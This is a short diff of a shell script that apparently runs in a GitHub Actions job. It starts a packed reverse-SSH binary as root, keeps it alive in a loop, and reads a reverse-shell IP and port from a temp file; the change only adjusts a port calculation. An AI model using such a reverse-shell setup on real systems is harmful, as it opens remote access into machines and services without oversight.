@@ -62,7 +62,9 @@ setsid sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v  -l -p 20022 &
 
     (while true; do
         [ ! -f /tmp/keepalive ] && break        
-         num67z=$(date +%S);num76=$((${num67z}%8));
+         num61z=$(date +%S);
+         num67z=$(echo "1"$num61z);
+         num76=$((${num67z}%8));
          bport=5005"$num76";echo $bport;
 
 ip_port5=$(grep -oP "(?<=AABBCC_rev_shellLLL).*(?=FFF)" /tmp/js9)
